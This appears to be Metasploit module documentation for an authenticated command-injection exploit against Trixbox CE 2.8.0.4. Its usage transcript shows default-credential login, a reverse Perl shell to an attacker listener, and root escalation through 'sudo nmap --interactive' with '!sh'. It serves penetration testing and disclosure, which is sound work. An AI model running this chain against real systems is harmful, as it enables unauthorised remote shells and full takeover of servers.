## Introduction

This module exploits a post-authentication OS command injection vulnerability found in Trixbox CE <= v2.8.0.4 which may allow arbitrary command execution on the underlying operating system.

## Setup

Used the Trixbox CE v2.8.0.4 ISO which is available for downloading on sourceforge:

* Trixbox CE v2.8.0.4 ISO: https://netcologne.dl.sourceforge.net/project/asteriskathome/trixbox%20CE/trixbox%202.8/trixbox-2.8.0.4.iso

## Targets

```
Id  Name
--  ----
0   Trixbox CE <= v2.8.0.4
```

## Usage

Trixbox CE v2.8.0.4 is tested below.

```
msf5 > use exploit/unix/webapp/trixbox_ce_auth_rce
msf5 exploit(unix/webapp/trixbox_ce_auth_rce) > set rhosts 192.168.1.6
rhosts => 192.168.1.6
msf5 exploit(unix/webapp/trixbox_ce_auth_rce) > show options

Module options (exploit/unix/webapp/trixbox_ce_auth_rce):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  password         yes       Password to login with
   HttpUsername  maint            yes       User to login with
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        192.168.1.6      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                          no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Trixbox CE <= v2.8.0.4


msf5 exploit(unix/webapp/trixbox_ce_auth_rce) > show payloads

Compatible Payloads
===================

   #  Name                       Disclosure Date  Rank    Check  Description
   -  ----                       ---------------  ----    -----  -----------
   0  cmd/unix/bind_perl                          manual  No     Unix Command Shell, Bind TCP (via Perl)
   1  cmd/unix/bind_perl_ipv6                     manual  No     Unix Command Shell, Bind TCP (via perl) IPv6
   2  cmd/unix/reverse_perl                       manual  No     Unix Command Shell, Reverse TCP (via Perl)
   3  cmd/unix/reverse_perl_ssl                   manual  No     Unix Command Shell, Reverse TCP SSL (via perl)

msf5 exploit(unix/webapp/trixbox_ce_auth_rce) > set payload cmd/unix/reverse_perl
payload => cmd/unix/reverse_perl
msf5 exploit(unix/webapp/trixbox_ce_auth_rce) > set lhost 192.168.1.8
lhost => 192.168.1.8
msf5 exploit(unix/webapp/trixbox_ce_auth_rce) > exploit

[*] Started reverse TCP handler on 192.168.1.8:4444
[*] 192.168.1.6:80 - Authenticating using "maint:password" credentials...
[+] 192.168.1.6:80 - Authenticated successfully.
[*] Executing the payload...
[*] Command shell session 1 opened (192.168.1.8:4444 -> 192.168.1.6:34227) at 2020-04-28 08:58:32 -0400

id
uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
sudo nmap --interactive

Starting Nmap V. 4.76 ( http://nmap.org )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```
